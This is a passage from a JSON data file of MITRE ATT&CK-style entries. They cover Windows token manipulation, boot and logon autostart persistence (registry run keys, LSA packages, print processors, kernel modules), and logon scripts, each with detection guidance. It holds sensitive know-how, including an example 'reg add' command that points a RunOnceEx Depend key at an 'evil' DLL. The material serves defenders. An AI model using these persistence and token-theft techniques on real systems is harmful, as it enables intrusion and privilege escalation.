        "description": " \nAdversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token. \nAn adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e.  Token Impersonation/Theft ) or used to spawn a new process (i.e.  Create Process with Token ). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.  \n\nAny standard user can use the  runas command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.  ",
        "detection": "\nIf an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the runas command. Detailed command-line logging is not enabled by default in Windows. If an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior. There are many Windows API calls a payload can take advantage of to manipulate access tokens (e.g., LogonUser  , DuplicateTokenEx , and ImpersonateLoggedOnUser ). Please see the referenced Windows API pages for more information.Query systems for process and thread token information and look for inconsistencies such as user owns processes impersonating the local SYSTEM account. Look for inconsistencies between the various fields that store PPID information, such as the EventHeader ProcessId from data collected via Event Tracing for Windows (ETW), Creator Process ID/Name from Windows event logs, and the ProcessID and ParentProcessID (which are also produced from ETW and other utilities such as Task Manager and Process Explorer). The ETW provided EventHeader ProcessId identifies the actual parent process.\n\n"
      },
      "T1134.001": {
        "name": "Token Impersonation/Theft",
        "description": " \nAdversaries may duplicate then impersonate another user's token to escalate privileges and bypass access controls. An adversary can create a new access token that duplicates an existing token using  DuplicateToken(Ex) . The token can then be used with  ImpersonateLoggedOnUser to allow the calling thread to impersonate a logged on user's security context, or with  SetThreadToken to assign the impersonated token to a thread. \nAn adversary may do this when they have a specific, existing process they want to assign the new token to. For example, this may be useful for when the target user has a non-network logon session on the system.  ",
        "detection": "\nIf an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the runas command. Detailed command-line logging is not enabled by default in Windows. Analysts can also monitor for use of Windows APIs such as DuplicateToken(Ex),  ImpersonateLoggedOnUser , and  SetThreadToken  and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.\n\n"
      },
      "T1134.002": {
        "name": "Create Process with Token",
        "description": " \nAdversaries may create a new process with a duplicated token to escalate privileges and bypass access controls. An adversary can duplicate a desired access token with  DuplicateToken(Ex) and use it with  CreateProcessWithTokenW to create a new process running under the security context of the impersonated user. This is useful for creating a new process under the security context of a different user.  ",
        "detection": "\nIf an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the runas command. Detailed command-line logging is not enabled by default in Windows. If an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior.Analysts can also monitor for use of Windows APIs such as DuplicateToken(Ex) and CreateProcessWithTokenW and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.\n\n"
      },
      "T1134.003": {
        "name": "Make and Impersonate Token",
        "description": " \nAdversaries may make and impersonate tokens to escalate privileges and bypass access controls. If an adversary has a username and password but the user is not logged onto the system, the adversary can then create a logon session for the user using the  LogonUser function. The function will return a copy of the new session's access token and the adversary can use  SetThreadToken to assign the token to a thread.  ",
        "detection": "\nIf an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the runas command. Detailed command-line logging is not enabled by default in Windows. If an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior.Analysts can also monitor for use of Windows APIs such as LogonUser and  SetThreadToken and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.\n\n"
      },
      "T1134.004": {
        "name": "Parent PID Spoofing",
        "description": " \nAdversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the  CreateProcess API call, which supports a parameter that defines the PPID to use.  \nThis functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via  svchost.exe or  consent.exe ) rather than the current user context.  \n\nAdversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of  PowerShell /  Rundll32 to be  explorer.exe rather than an Office document delivered as part of  Spearphishing Attachment .  \nThis spoofing could be executed via  Visual Basic within a malicious Office document or any code that can perform  Native API .  \n \n\nExplicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as  lsass.exe ), causing the new process to be elevated via the inherited access token.  \n ",
        "detection": "\nLook for inconsistencies between the various fields that store PPID information, such as the EventHeader ProcessId from data collected via Event Tracing for Windows (ETW), Creator Process ID/Name from Windows event logs, and the ProcessID and ParentProcessID (which are also produced from ETW and other utilities such as Task Manager and Process Explorer). The ETW provided EventHeader ProcessId identifies the actual parent process. Monitor and analyze API calls to CreateProcess/CreateProcessA, specifically those from user/potentially malicious processes and with parameters explicitly assigning PPIDs (ex: the Process Creation Flags of 0x8XXX, indicating that the process is being created with extended startup information ). Malicious use of CreateProcess/CreateProcessA may also be proceeded by a call to UpdateProcThreadAttribute, which may be necessary to update process creation attributes.  This may generate false positives from normal UAC elevation behavior, so compare to a system baseline/understanding of normal system activity if possible.\n\n"
      },
      "T1134.005": {
        "name": "SID-History Injection",
        "description": " \nAdversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens.  \nAn account can hold additional SIDs in the SID-History Active Directory attribute  \n, allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens). \nWith Domain Administrator (or equivalent) rights, harvested or well-known SID values  \nmay be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as  Remote Services ,  Windows Admin Shares , or  Windows Remote Management .  ",
        "detection": "\nExamine data in user’s SID-History attributes using the PowerShell Get-ADUser cmdlet  , especially users who have SID-History values from the same domain.   Also monitor account management events on Domain Controllers for successful and failed changes to SID-History.    Monitor for Windows API calls to the DsAddSidHistory function.  \n\n"
      },
      "T1547": {
        "name": "Boot or Logon Autostart Execution",
        "description": " \nAdversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.  \n \n \n \n \nThese mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel. \nSince some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.  ",
        "detection": "\nMonitor for additions or modifications of mechanisms that could be used to trigger autostart execution, such as relevant additions to the Registry. Look for changes that are not correlated with known updates, patches, or other planned administrative activity. Tools such as Sysinternals Autoruns may also be used to detect system autostart configuration changes that could be attempts at persistence.   Changes to some autostart configuration settings may happen under normal conditions when legitimate software is installed. Suspicious program execution as autostart programs may show up as outlier processes that have not been seen before when compared against historical data.To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.Monitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Look for abnormal process behavior that may be due to a process loading a malicious DLL.Monitor for abnormal usage of utilities and command-line parameters involved in kernel modification or driver installation.\n\n"
      },
      "T1547.001": {
        "name": "Registry Run Keys / Startup Folder",
        "description": " \nAdversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.  \nThese programs will be executed under the context of the user and will have the account's associated permissions level. \nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is  C:\\Users[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup . The startup folder path for all users is  C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp . \nThe following run keys are created by default on Windows systems:  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce  HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run  HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce \nRun keys may exist under multiple hives.  \n \nThe  HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.  \nFor example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx:  reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"   \n\nThe following Registry keys can be used to set startup folder items for persistence:  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders  HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders  HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders \nThe following Registry keys can control automatic startup of services during boot:  HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce  HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices \nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:  HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run \nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The  HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit and  HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell subkeys can automatically launch programs. \nPrograms listed in the load value of the registry key  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows run when any user logs on. \nBy default, the multistring  BootExecute value of the registry key  HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager is set to  autocheck autochk * . This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot. \nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use  Masquerading to make the Registry entries look as if they are associated with legitimate programs.  ",
        "detection": "\nMonitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.   Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.Changes to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\n"
      },
      "T1547.002": {
        "name": "Authentication Package",
        "description": " \nAdversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.  \n\nAdversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location  HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ with the key value of  \"Authentication Packages\"=<target binary> . The binary will then be executed by the system when the authentication packages are loaded.  ",
        "detection": "\nMonitor the Registry for changes to the LSA Registry keys. Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned DLLs try to load into the LSA by setting the Registry key HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LSASS.exe with AuditLevel = 8.    \n\n"
      },
      "T1547.003": {
        "name": "Time Providers",
        "description": " \nAdversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains.  \nW32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.  \n\nTime providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of  HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\ .  \nThe time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.  \n\nAdversaries may abuse this architecture to establish persistence, specifically by registering and enabling a malicious DLL as a time provider. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.  \n ",
        "detection": "\nBaseline values and monitor/analyze activity related to modifying W32Time information in the Registry, including application programming interface (API) calls such as RegCreateKeyEx and RegSetValueEx as well as execution of the W32tm.exe utility.   There is no restriction on the number of custom time providers registrations, though each may require a DLL payload written to disk.  The Sysinternals Autoruns tool may also be used to analyze auto-starting locations, including DLLs listed as time providers.  \n\n"
      },
      "T1547.004": {
        "name": "Winlogon Helper DLL",
        "description": " \nAdversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in  HKLM\\Software[\\Wow6432Node\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ and  HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ are used to manage additional helper programs and functionalities that support Winlogon.  \n \nMalicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse:  \nWinlogon\\Notify - points to notification package DLLs that handle Winlogon events Winlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs on \nAdversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.  ",
        "detection": "\nMonitor for changes to Registry entries associated with Winlogon that do not correlate with known software, patch cycles, etc. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current Winlogon helper values.    New DLLs written to System32 that do not correlate with known good software or patching may also be suspicious.Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\n"
      },
      "T1547.005": {
        "name": "Security Support Provider",
        "description": " \nAdversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. \nThe SSP configuration is stored in two Registry keys:  HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages and  HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages . An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.  \n ",
        "detection": "\nMonitor the Registry for changes to the SSP Registry keys. Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned SSP DLLs try to load into the LSA by setting the Registry key HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LSASS.exe with AuditLevel = 8.    \n\n"
      },
      "T1547.006": {
        "name": "Kernel Modules and Extensions",
        "description": " \nAdversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system.  \n \nWhen used maliciously, LKMs can be a type of kernel-mode  Rootkit that run with the highest operating system privilege (Ring 0).  \nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users.  \n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through  kextload and  kextunload commands. \nAdversaries can use LKMs and kexts to covertly persist on a system and elevate privileges. Examples have been found in the wild and there are some open source projects.  \n  \n  \n  \n \n  \n \n  \n ",
        "detection": "\nLoading, unloading, and manipulating modules on Linux systems can be detected by monitoring for the following commands:modprobe, insmod, lsmod, rmmod, or modinfo   LKMs are typically loaded into /lib/modules and have had the extension .ko (\"kernel object\") since version 2.6 of the Linux kernel.  For macOS, monitor for execution of kextload commands and correlate with other unknown or suspicious activity.Adversaries may run commands on the target system before loading a malicious module in order to ensure that it is properly compiled.   Adversaries may also execute commands to identify the exact version of the running Linux kernel and/or download multiple versions of the same .ko (kernel object) files to use the one appropriate for the running system.  Many LKMs require Linux headers (specific to the target kernel) in order to compile properly. These are typically obtained through the operating systems package manager and installed like a normal package. On Ubuntu and Debian based systems this can be accomplished by running: apt-get install linux-headers-$(uname -r) On RHEL and CentOS based systems this can be accomplished by running: yum install kernel-devel-$(uname -r)\n\n"
      },
      "T1547.007": {
        "name": "Re-opened Applications",
        "description": " \nAdversaries may modify plist files to automatically run an application when a user logs in. Starting in Mac OS X 10.7 (Lion), users can specify certain applications to be re-opened when a user logs into their machine after reboot. While this is usually done via a Graphical User Interface (GUI) on an app-by-app basis, there are property list files (plist) that contain this information as well located at  ~/Library/Preferences/com.apple.loginwindow.plist and  ~/Library/Preferences/ByHost/com.apple.loginwindow.* .plist . \nAn adversary can modify one of these files directly to include a link to their malicious executable to provide a persistence mechanism each time the user reboots their machine  \n.  ",
        "detection": "\nMonitoring the specific plist files associated with reopening applications can indicate when an application has registered itself to be reopened.\n\n"
      },
      "T1547.008": {
        "name": "LSASS Driver",
        "description": " \nAdversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.  \n\nAdversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g.,  Hijack Execution Flow ), an adversary can use LSA operations to continuously execute malicious payloads.  ",
        "detection": "\nWith LSA Protection enabled, monitor the event logs (Events 3033 and 3063) for failed attempts to load LSA plug-ins and drivers.   Also monitor DLL load operations in lsass.exe.  Utilize the Sysinternals Autoruns/Autorunsc utility   to examine loaded drivers associated with the LSA. \n\n"
      },
      "T1547.009": {
        "name": "Shortcut Modification",
        "description": " \nAdversaries may create or edit shortcuts to run a program during system boot or user login. Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process. \nAdversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use  Masquerading to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.  ",
        "detection": "\nSince a shortcut's target path likely will not change, modifications to shortcut files that do not correlate with known software changes, patches, removal, etc., may be suspicious. Analysis should attempt to relate shortcut file change or creation events to other potentially suspicious events based on known adversary behavior such as process launches of unknown executables that make network connections.\n\n"
      },
      "T1547.010": {
        "name": "Port Monitors",
        "description": " \nAdversaries may use port monitors to run an attacker supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the  AddMonitor API call to set a DLL to be loaded at startup.  \nThis DLL can be located in  C:\\Windows\\System32 and will be loaded by the print spooler service, spoolsv.exe, on boot. The spoolsv.exe process also runs under SYSTEM level permissions.  \nAlternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to  HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors . \nThe Registry key contains entries for the following: Local Port Standard TCP/IP Port USB Monitor WSD Port \nAdversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM.  ",
        "detection": "\nMonitor process API calls to AddMonitor.  Monitor DLLs that are loaded by spoolsv.exe for DLLs that are abnormal. New DLLs written to the System32 directory that do not correlate with known good software or patching may be suspicious. Monitor Registry writes to HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors. Run the Autoruns utility, which checks for this Registry key as a persistence mechanism  \n\n"
      },
      "T1547.011": {
        "name": "Plist Modification",
        "description": " \nAdversaries may modify plist files to run a program during system boot or user login. Property list (plist) files contain all of the information that macOS and OS X uses to configure applications and services. These files are UTF-8 encoded and formatted like XML documents via a series of keys surrounded by < >. They detail when programs should execute, file paths to the executables, program arguments, required OS permissions, and many others. plists are located in certain locations depending on their purpose such as  /Library/Preferences (which execute with elevated privileges) and  ~/Library/Preferences (which execute with a user's privileges). \nAdversaries can modify plist files to execute their code as part of establishing persistence. plists may also be used to elevate privileges since they may execute in the context of another user.  \n \nA specific plist used for execution at login is  com.apple.loginitems.plist .  \nApplications under this plist run under the logged in user's context, and will be started every time the user logs in. Login items installed using the Service Management Framework are not visible in the System Preferences and can only be removed by the application that created them.  \nUsers have direct control over login items installed using a shared file list which are also visible in System Preferences  \n. Some of these applications can open visible dialogs to the user, but they don’t all have to since there is an option to \"hide\" the window. If an adversary can register their own login item or modified an existing one, then they can use it to execute their code for a persistence mechanism each time the user logs in  \n  \n. The API method  SMLoginItemSetEnabled can be used to set Login Items, but scripting languages like  AppleScript can do this as well.  \n ",
        "detection": "\nFile system monitoring can determine if plist files are being modified. Users should not have permission to modify these in most cases. Some software tools like \"Knock Knock\" can detect persistence mechanisms and point to the specific files that are being referenced. This can be helpful to see what is actually being executed.All the login items created via shared file lists are viewable by going to the Apple menu -> System Preferences -> Users & Groups -> Login items. This area (and the corresponding file locations) should be monitored and allowed for known good applications. Otherwise, Login Items are located in  Contents/Library/LoginItems  within an application bundle, so these paths should be monitored as well. Monitor process execution for abnormal process execution resulting from modified plist files. Monitor utilities used to modify plist files or that take a plist file as an argument, which may indicate suspicious activity.\n\n"
      },
      "T1547.012": {
        "name": "Print Processors",
        "description": " \nAdversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, spoolsv.exe, during boot. \nAdversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the  AddPrintProcessor API call with an account that has  SeLoadDriverPrivilege enabled. Alternatively, a print processor can be registered to the print spooler service by adding the  HKLM\\SYSTEM\\[CurrentControlSet or ControlSet001]\\Control\\Print\\Environments\\[Windows architecture: e.g., Windows x64]\\Print Processors\\[user defined]\\Driver Registry key that points to the DLL. For the print processor to be correctly installed, it must be located in the system print-processor directory that can be found with the  GetPrintProcessorDirectory API call.  \nAfter the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.  \nThe print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.  ",
        "detection": "\nMonitor process API calls to AddPrintProcessor and GetPrintProcessorDirectory. New print processor DLLs are written to the print processor directory. Also monitor Registry writes to HKLM\\SYSTEM\\ControlSet001\\Control\\Print\\Environments\\[Windows architecture]\\Print Processors\\[user defined]\\Driver or HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\[Windows architecture]\\Print Processors\\[user defined]\\Driver as they pertain to print processor installations.Monitor for abnormal DLLs that are loaded by spoolsv.exe. Print processors that do not correlate with known good software or patching may be suspicious.\n\n"
      },
      "T1037": {
        "name": "Boot or Logon Initialization Scripts",
        "description": " \nAdversaries may use scripts automatically executed at boot or logon initialization to establish persistence. Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely. \nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. \nAn adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.  ",
        "detection": "\nMonitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties. Monitor running process for actions that could be indicative of abnormal programs or executables running upon logon.\n\n"
      },
      "T1037.001": {
        "name": "Logon Script (Windows)",
        "description": " \nAdversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system.  \nThis is done via adding a path to a script to the  HKCU\\Environment\\UserInitMprLogonScript Registry key.  \n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.  ",
        "detection": "\nMonitor for changes to Registry values associated with Windows logon scrips, nameley HKCU\\Environment\\UserInitMprLogonScript.Monitor running process for actions that could be indicative of abnormal programs or executables running upon logon.\n\n"
      },
      "T1037.002": {
        "name": "Logon Script (Mac)",
        "description": " \nAdversaries may use macOS logon scripts automatically executed at logon initialization to establish persistence. macOS allows logon scripts (known as login hooks) to be executed whenever a specific user logs into a system. A login hook tells Mac OS X to execute a certain script when a user logs in, but unlike  Startup Items , a login hook executes as the elevated root user.  \n\nAdversaries may use these login hooks to maintain persistence on a single system.  \nAccess to login hook scripts may allow an adversary to insert additional malicious code. There can only be one login hook at a time though and depending on the access configuration of the hooks, either local credentials or an administrator account may be necessary.  ",
        "detection": "\nMonitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties. Monitor running process for actions that could be indicative of abnormal programs or executables running upon logon.\n\n"
      },
      "T1037.003": {
        "name": "Network Logon Script",
        "description": " \nAdversaries may use network logon scripts automatically executed at logon initialization to establish persistence. Network logon scripts can be assigned using Active Directory or Group Policy Objects.  \nThese logon scripts run with the privileges of the user they are assigned to. Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems. \nAdversaries may use these scripts to maintain persistence on a network. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.  ",
        "detection": "\nMonitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties. Monitor running process for actions that could be indicative of abnormal programs or executables running upon logon.\n\n"
      },
      "T1037.004": {
        "name": "Rc.common",
        "description": " \nAdversaries may use rc.common automatically executed at boot initialization to establish persistence. During the boot process, macOS executes  source /etc/rc.common , which is a shell script containing various utility functions. This file also defines routines for processing command-line arguments and for gathering system settings and is thus recommended to include in the start of Startup Item Scripts  \n. In macOS and OS X, this is now a deprecated mechanism in favor of  Launch Agent and  Launch Daemon but is currently still used. \nAdversaries can use the rc.common file as a way to hide code for persistence that will execute on each reboot as the root user.  \n ",
        "detection": "\nThe /etc/rc.common file can be monitored to detect changes from the company policy. Monitor process execution resulting from the rc.common script for unusual or unknown applications or behavior. \n\n"
      },
      "T1037.005": {
        "name": "Startup Items",
        "description": " \nAdversaries may use startup items automatically executed at boot initialization to establish persistence. Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items.  \n\nThis is technically a deprecated technology (superseded by  Launch Daemon ), and thus the appropriate folder,  /Library/StartupItems isn’t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist),  StartupParameters.plist , reside in the top-level directory. \nAn adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism  \n. Additionally, since StartupItems run during the bootup phase of macOS, they will run as the elevated root user.  ",
        "detection": "\nThe /Library/StartupItems folder can be monitored for changes. Similarly, the programs that are actually executed from this mechanism should be checked against a whitelist.Monitor processes that are executed during the bootup process to check for unusual or unknown applications and behavior.\n\n"
      },
      "T1543": {
        "name": "Create or Modify System Process",
        "description": " \nAdversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services.  \nOn macOS, launchd processes known as  Launch Daemon and  Launch Agent are run to finish system initialization and load user specific parameters.  \n \nAdversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect. \nServices, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges.  \n.  ",
        "detection": "\nMonitor for changes to system processes that do not correlate with known software, patch cycles, etc., including by comparing results against a trusted system baseline. New, benign system processes may be created during installation of new software. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.  Command-line invocation of tools capable of modifying services may be unusual, depending on how systems are typically used in a particular environment. Look for abnormal process call trees from known services and for execution of other commands that could relate to Discovery or other adversary techniques. Monitor for changes to files associated with system-level processes.\n\n"
